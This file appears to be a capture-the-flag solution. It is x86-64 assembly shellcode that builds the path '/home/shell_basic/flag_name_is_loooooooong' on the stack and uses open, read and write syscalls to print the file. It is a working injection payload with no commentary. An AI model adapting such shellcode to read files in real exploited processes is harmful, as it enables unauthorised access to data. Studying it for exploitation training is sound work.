section .text
global _start
_start:
    xor rax, rax
    push rax                                                 
    
    mov rax, 0x676e6f6f6f6f6f6f 
    push rax
    mov rax, 0x6c5f73695f656d61 
    push rax
    mov rax, 0x6e5f67616c662f63 
    push rax
    mov rax, 0x697361625f6c6c65 
    push rax
    mov rax, 0x68732f656d6f682f 
    push rax
    mov rdi, rsp
    xor rax, rax
    xor rsi, rsi
    mov eax, 2          
    syscall

    mov rdi, rax        
    sub rsp, 0x100
    mov rsi, rsp
    mov rdx, 0x100
    xor eax, eax        
    syscall

    mov rdx, rax       
    mov rdi, 1
    mov rax, 1          
    syscall
